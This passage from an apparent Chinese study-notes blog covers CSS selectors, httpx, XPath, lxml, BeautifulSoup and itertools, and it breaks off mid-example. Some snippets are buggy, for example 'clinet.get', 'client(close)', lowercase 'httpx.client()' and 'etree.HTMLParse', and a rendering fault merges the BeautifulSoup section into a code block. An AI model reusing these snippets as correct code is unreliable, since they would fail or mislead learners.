href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Column_combinator">列组合器</a>     实验性</p><p>​    <code>||</code> 组合器选择属于某个表格行的节点。    <strong>语法：</strong><code>A || B</code>    <strong>例子：</strong><code>col || td</code> 会匹配所有  作用域内的 ` (en-US)](<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/td">https://developer.mozilla.org/en-US/docs/Web/HTML/Element/td</a>) 元素。</p></li></ul><h3 id="伪选择器pseudo"><a class="markdownIt-Anchor" href="#伪选择器pseudo"></a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors#%E4%BC%AA%E9%80%89%E6%8B%A9%E5%99%A8%EF%BC%88pseudo%EF%BC%89">伪选择器（Pseudo）</a></h3><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Pseudo-classes">伪类</a></p><p>​    <code>:</code> 伪选择器支持按照未被包含在文档树中的状态信息来选择元素。    <strong>例子：</strong><code>a:visited</code> 匹配所有曾被访问过的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/a">``</a> 元素。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Pseudo-elements">伪元素</a></p><h4 id="伪选择器用于表示无法用-html-语义表达的实体-例子pfirst-line-匹配所有-元素的第一行"><a class="markdownIt-Anchor" href="#伪选择器用于表示无法用-html-语义表达的实体-例子pfirst-line-匹配所有-元素的第一行"></a> <code>::</code> 伪选择器用于表示无法用 HTML 语义表达的实体。    <strong>例子：</strong><code>p::first-line</code> 匹配所有 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p">``</a> 元素的第一行。</h4></li></ul><h2 id="httpx"><a class="markdownIt-Anchor" href="#httpx"></a> <strong>httpx</strong></h2><p>httpx针对于爬取http2.0协议的网站</p><p>httpx官方文档：<a href="https://www.python-httpx.org/quickstart">https://www.python-httpx.org/quickstart</a></p><blockquote><p>httpx 和 requests 的API 极其相似</p></blockquote><h3 id="基本用法"><a class="markdownIt-Anchor" href="#基本用法"></a> <strong>基本用法</strong></h3><ul><li>GET</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> httpx   response<span class="token operator">=</span>httpx<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://spa16.scrape.center'</span><span class="token punctuation">)</span>response<span class="token punctuation">.</span>status_code<span class="token comment">#状态码</span>response<span class="token punctuation">.</span>headers<span class="token comment">#响应头  返回一个Headers对象，类似于一个字典</span>response<span class="token punctuation">.</span>text <span class="token comment">#正文内容 </span><span class="token comment">#更换UserAgent</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0'</span><span class="token punctuation">&#125;</span>response<span class="token operator">=</span>httpx<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>其他方法:httpx.get/post/put/delete/patch</p></li><li><p>Response对象的属性和方法</p><ul><li>status_code 状态码</li><li>text 响应体的文本内容</li><li>content 响应体的二进制内容</li><li>headers 响应头</li><li>json 方法，将文本结果转化为json对象</li></ul></li></ul><h3 id="client对象"><a class="markdownIt-Anchor" href="#client对象"></a> <strong>Client对象</strong></h3><blockquote><p>可以与requests中的Session对象类比学习</p><p>client的更多高级用法:<a href="https://www.python-httpx.org/advanced">https://www.python-httpx.org/advanced</a></p></blockquote><ul><li>使用方式:比较推荐的使用方式:with as</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> httpx<span class="token keyword">with</span> httpx<span class="token punctuation">.</span>client<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> client<span class="token punctuation">:</span>    response<span class="token operator">=</span>client<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/get'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>等价于</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> httpxclient<span class="token operator">=</span>httpx<span class="token punctuation">.</span>Client<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    response<span class="token operator">=</span>clinet<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/get'</span><span class="token punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    client<span class="token punctuation">(</span>close<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>填入参数 header=?</p></li><li><p>新参数http_version 若http2=True 则支持http2  默认是关闭的不支持http2</p></li><li><p>支持异步客户端请求</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> httpx<span class="token keyword">import</span> asyncio <span class="token comment">#一个异步爬虫框架</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">async</span> <span class="token keyword">with</span> httpx<span class="token punctuation">.</span>AsyncClient<span class="token punctuation">(</span>http2<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token keyword">as</span> client<span class="token punctuation">:</span>        response<span class="token operator">=</span><span class="token keyword">await</span> client<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>fetch<span class="token punctuation">(</span><span class="token string">'https://www.httpbin.org/get'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="x-path"><a class="markdownIt-Anchor" href="#x-path"></a> X-Path</h2><p>XPath的全程是XML PATH Language 即xml路径语言，用于在xml文档中 查找信息，但是同样适用于HTML文档的搜索</p><h3 id="xpath语法"><a class="markdownIt-Anchor" href="#xpath语法"></a> Xpath语法</h3><h4 id="xml实例"><a class="markdownIt-Anchor" href="#xml实例"></a> xml实例</h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bookstore</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>eng<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Harry Potter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>29.99<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>book</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>eng<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Learning XML<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>price</span><span class="token punctuation">></span></span>39.95<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>price</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>book</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bookstore</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="术语"><a class="markdownIt-Anchor" href="#术语"></a> 术语</h4><p>在 XPath 中，有七种类型的<strong>节点</strong>：元素、属性、文本、命名空间、处理指令、注释以及文档（根）节点。XML 文档是被作为节点树来对待的。树的根被称为文档节点或者根节点。</p><p><strong>基本值</strong>是无父或无子的节点。</p><p><strong>项目</strong>是基本值或者节点</p><p>每个元素以及属性都有一个<strong>父</strong>。</p><p>元素节点可有零个、一个或多个<strong>子</strong>。</p><p><strong>同胞</strong>：拥有相同的父的节点</p><p><strong>先辈</strong>：某节点的父、父的父，等等</p><p><strong>后代</strong>:    某个节点的子，子的子</p><p><strong>轴</strong>:可定义相对于当前节点的节点集。</p><table><thead><tr><th>轴名称</th><th>结果</th></tr></thead><tbody><tr><td>ancestor</td><td>选取当前节点的所有先辈（父、祖父等）。</td></tr><tr><td>ancestor-or-self</td><td>选取当前节点的所有先辈（父、祖父等）以及当前节点本身。</td></tr><tr><td>attribute</td><td>选取当前节点的所有属性。</td></tr><tr><td>child</td><td>选取当前节点的所有子元素。</td></tr><tr><td>descendant</td><td>选取当前节点的所有后代元素（子、孙等）。</td></tr><tr><td>descendant-or-self</td><td>选取当前节点的所有后代元素（子、孙等）以及当前节点本身。</td></tr><tr><td>following</td><td>选取文档中当前节点的结束标签之后的所有节点。</td></tr><tr><td>following-sibling</td><td>选取当前节点之后的所有兄弟节点</td></tr><tr><td>namespace</td><td>选取当前节点的所有命名空间节点。</td></tr><tr><td>parent</td><td>选取当前节点的父节点。</td></tr><tr><td>preceding</td><td>选取文档中当前节点的开始标签之前的所有节点。</td></tr><tr><td>preceding-sibling</td><td>选取当前节点之前的所有同级节点。</td></tr><tr><td>self</td><td>选取当前节点。</td></tr></tbody></table><h4 id="选取节点"><a class="markdownIt-Anchor" href="#选取节点"></a> 选取节点</h4><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td>nodename</td><td>读取此节点的所有子节点</td></tr><tr><td>/</td><td>从当前节点选取直接子节点</td></tr><tr><td>//</td><td>从当前节点选取子孙节点</td></tr><tr><td>.</td><td>选取当前节点</td></tr><tr><td>…</td><td>选取当前节点的父节点</td></tr><tr><td>@</td><td>选取属性</td></tr></tbody></table><p>eg://title[@lang=‘eng’] 表示 所有名称为title，同时属性lang的值为eng的节点</p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>bookstore</td><td>选取 bookstore 元素的所有子节点。</td></tr><tr><td>/bookstore</td><td>选取根元素 bookstore。 注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！</td></tr><tr><td>bookstore/book</td><td>选取属于 bookstore 的子元素的所有 book 元素。</td></tr><tr><td>//book</td><td>选取所有 book 子元素，而不管它们在文档中的位置。</td></tr><tr><td>bookstore//book</td><td>选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。</td></tr><tr><td>//@lang</td><td>选取名为 lang 的所有属性。</td></tr></tbody></table><h4 id="谓语predicates"><a class="markdownIt-Anchor" href="#谓语predicates"></a> 谓语（Predicates）</h4><p>谓语用来查找某个特定的节点或者包含某个指定的值的节点。</p><p>谓语被嵌在方括号中。</p><p>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>/bookstore/book[1]</td><td>选取属于 bookstore 子元素的第一个 book 元素。</td></tr><tr><td>/bookstore/book[last()]</td><td>选取属于 bookstore 子元素的最后一个 book 元素。</td></tr><tr><td>/bookstore/book[last()-1]</td><td>选取属于 bookstore 子元素的倒数第二个 book 元素。</td></tr><tr><td>/bookstore/book[position()❤️]</td><td>选取最前面的两个属于 bookstore 元素的子元素的 book 元素。</td></tr><tr><td>//title[@lang]</td><td>选取所有拥有名为 lang 的属性的 title 元素。</td></tr><tr><td>//title[@lang=‘eng’]</td><td>选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。</td></tr><tr><td>/bookstore/book[price&gt;35.00]</td><td>选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。</td></tr><tr><td>/bookstore/book[price&gt;35.00]//title</td><td>选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</td></tr></tbody></table><h4 id="选取未知节点"><a class="markdownIt-Anchor" href="#选取未知节点"></a> 选取未知节点</h4><p>XPath 通配符可用来选取未知的 XML 元素。</p><table><thead><tr><th>通配符</th><th>描述</th></tr></thead><tbody><tr><td>*</td><td>匹配任何元素节点。</td></tr><tr><td>@*</td><td>匹配任何属性节点。</td></tr><tr><td>node()</td><td>匹配任何类型的节点。</td></tr></tbody></table><p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>/bookstore/*</td><td>选取 bookstore 元素的所有子元素。</td></tr><tr><td>//*</td><td>选取文档中的所有元素。</td></tr><tr><td>//title[@*]</td><td>选取所有带有属性的 title 元素。</td></tr></tbody></table><h4 id="选取若干路径"><a class="markdownIt-Anchor" href="#选取若干路径"></a> 选取若干路径</h4><p>通过在路径表达式中使用&quot;|&quot;运算符，您可以选取若干个路径。</p><p>在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：</p><table><thead><tr><th>路径表达式</th><th>结果</th></tr></thead><tbody><tr><td>//book/title | //book/price</td><td>选取 book 元素的所有 title 和 price 元素。</td></tr><tr><td>//title | //price</td><td>选取文档中的所有 title 和 price 元素。</td></tr><tr><td>/bookstore/book/title | //price</td><td>选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。</td></tr></tbody></table><h4 id="运算符"><a class="markdownIt-Anchor" href="#运算符"></a> <strong>运算符</strong></h4><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th><th>返回值</th></tr></thead><tbody><tr><td>|</td><td>计算两个节点集</td><td>//book | //cd</td><td>返回所有拥有 book 和 cd 元素的节点集</td></tr><tr><td>+</td><td>加法</td><td>6 + 4</td><td>10</td></tr><tr><td>-</td><td>减法</td><td>6 - 4</td><td>2</td></tr><tr><td>*</td><td>乘法</td><td>6 * 4</td><td>24</td></tr><tr><td>div</td><td>除法</td><td>8 div 4</td><td>2</td></tr><tr><td>=</td><td>等于</td><td>price=9.80</td><td>如果 price 是 9.80，则返回 true。 如果 price 是 9.90，则返回 false。</td></tr><tr><td>!=</td><td>不等于</td><td>price!=9.80</td><td>如果 price 是 9.90，则返回 true。 如果 price 是 9.80，则返回 false。</td></tr><tr><td>&lt;</td><td>小于</td><td>price&lt;9.80</td><td>如果 price 是 9.00，则返回 true。 如果 price 是 9.90，则返回 false。</td></tr><tr><td>&lt;=</td><td>小于或等于</td><td>price&lt;=9.80</td><td>如果 price 是 9.00，则返回 true。 如果 price 是 9.90，则返回 false。</td></tr><tr><td>&gt;</td><td>大于</td><td>price&gt;9.80</td><td>如果 price 是 9.90，则返回 true。 如果 price 是 9.80，则返回 false。</td></tr><tr><td>&gt;=</td><td>大于或等于</td><td>price&gt;=9.80</td><td>如果 price 是 9.90，则返回 true。 如果 price 是 9.70，则返回 false。</td></tr><tr><td>or</td><td>或</td><td>price=9.80 or price=9.70</td><td>如果 price 是 9.80，则返回 true。 如果 price 是 9.50，则返回 false。</td></tr><tr><td>and</td><td>与</td><td>price&gt;9.00 and price&lt;9.90</td><td>如果 price 是 9.80，则返回 true。 如果 price 是 8.50，则返回 false。</td></tr><tr><td>mod</td><td>计算除法的余数</td><td>5 mod 2</td><td>1</td></tr></tbody></table><h3 id="lxml库"><a class="markdownIt-Anchor" href="#lxml库"></a> lxml库</h3><p>可以通过xml库，利用XPath对HTML进行解析</p><p>demo1：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">import</span> requeststext <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://quotes.toscrape.com'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>texthtml <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token comment">#声明text是一段HTML文本，然后调用HTML类进行初始化，html就构成了一个XPath解析对象</span><span class="token comment">#另一种不声明对象的html解析方法</span>html<span class="token operator">=</span>etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>text<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>HTMLParse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>results<span class="token operator">=</span>etree<span class="token punctuation">.</span>tostring<span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token comment">#调用tostring的方法，可以自动修正HTML文本，返回的是bytes类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>results<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对results进行html的xpath解析实例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">result1<span class="token operator">=</span>html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*'</span><span class="token punctuation">)</span>rresult2<span class="token operator">=</span><span class="token keyword">print</span><span class="token punctuation">(</span>result1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一些xpath表达式的解析</p><blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span>a<span class="token punctuation">[</span>@href<span class="token operator">=</span><span class="token string">"link1.html"</span><span class="token punctuation">]</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>@ <span class="token keyword">class</span> <span class="token comment">#首先选中href属性为link4.html的a节点，然后获取其父节点，再获取父节点的class属性</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span>li<span class="token punctuation">[</span>@<span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"item-0"</span><span class="token punctuation">]</span><span class="token operator">/</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#先选取li节点，然后利用/选取其直接子节点a，在选取节点a 的文本</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token operator">/</span>bookstore<span class="token operator">/</span>book<span class="token punctuation">[</span>price<span class="token operator">></span><span class="token number">35</span><span class="token punctuation">]</span><span class="token operator">/</span>title <span class="token comment">#选取价格高于35的title节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token operator">//</span>li<span class="token punctuation">[</span>contains<span class="token punctuation">(</span>@<span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"li"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">/</span>a<span class="token operator">/</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#给第一个参数传入属性名称，第二个参数传入属性值</span><span class="token operator">></span>contains方法经常用于在某个节点的某个属性有多个值的时候用到<span class="token operator">**</span>运用lxml库的关键就是熟练掌握xpath选择语法<span class="token operator">**</span><span class="token comment">## beautifulsoup</span>https<span class="token punctuation">:</span><span class="token operator">//</span>beautifulsoup<span class="token punctuation">.</span>cn<span class="token operator">/</span>```python<span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token comment">#这是beautifulSoup的基本使用</span>url<span class="token operator">=</span><span class="token string">"http://quotes.toscrape.com/"</span>html<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>textsoup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span><span class="token comment">#对html源码初始化一个bs对象</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>prettify<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#以标准缩进显示</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>title<span class="token punctuation">)</span> <span class="token comment">#打印title节点的选择结果</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>title<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token comment">#打印title节点的文本内容</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>soup<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#这是bs4.element.Tag 类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>p<span class="token punctuation">)</span><span class="token comment">#结果是第一个p节点的内容</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>head<span class="token punctuation">)</span><span class="token comment">#结果是head节点的所有内容</span><span class="token comment">#获取节点的信息</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>p<span class="token punctuation">.</span>attrs<span class="token punctuation">)</span> <span class="token comment">#调用attrs获取p的所有属性</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>p<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token comment">#获取p节点的文本</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>p<span class="token punctuation">.</span>contents<span class="token punctuation">)</span><span class="token comment">#获取p的直接子节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="itertools"><a class="markdownIt-Anchor" href="#itertools"></a> itertools</h2><h3 id="infinite-iterators"><a class="markdownIt-Anchor" href="#infinite-iterators"></a> infinite iterators</h3><p><strong>count([start=0, step=1])</strong> 接收两个可选整形参数，第一个指定了迭代开始的值，第二个指定了迭代的步长。此外，start参数默认为0，step参数默认为1，可以根据需要来把这两个指定为其它值，或者使用默认参数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">20</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span><span class="token number">10</span><span class="token number">12</span><span class="token number">14</span><span class="token number">16</span><span class="token number">18</span><span class="token number">20</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>cycle(iterable)</strong> 是用一个可迭代对象中的元素来创建一个迭代器，并且复制自己的值，一直无限的重复下去。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>cycle<span class="token punctuation">(</span><span class="token string">"abcd"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>     <span class="token comment"># 具有无限的输出，可以按ctrl+c来停止。</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span>abcdabcdab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>**repeat(elem [,n])**是将一个元素重复n遍或者无穷多遍，并返回一个迭代器。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>repeat<span class="token punctuation">(</span><span class="token string">"abcd"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span>abcdabcdabcdabcdabcd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="combinatoric-iterators"><a class="markdownIt-Anchor" href="#combinatoric-iterators"></a> combinatoric iterators</h2><p>组合操作包括排列，笛卡儿积，或者一些离散元素的选择，组合迭代器就是产生这样序列的迭代器。我们来看看这几个函数的用法。</p><p><strong>product(*iterables, repeat=1)</strong> 得到的是可迭代对象的笛卡儿积，*iterables参数表示需要多个可迭代对象。这些可迭代对象之间的笛卡儿积，也可以使用for循环来实现，例如 <strong>product(A, B)</strong> 与 **((x,y) for x in A for y in B)**就实现一样的功能。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而 repeat 参数则表示这些可迭代序列重复的次数。例如 <strong>product(A, repeat=4)</strong> 与 **product(A, A, A, A)**实现的功能一样</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token string">'ab'</span><span class="token punctuation">,</span><span class="token string">'cd'</span><span class="token punctuation">,</span>repeat <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span>Running<span class="token punctuation">]</span> python <span class="token operator">-</span>u <span class="token string">"e:\pythonee\code\test.py"</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token 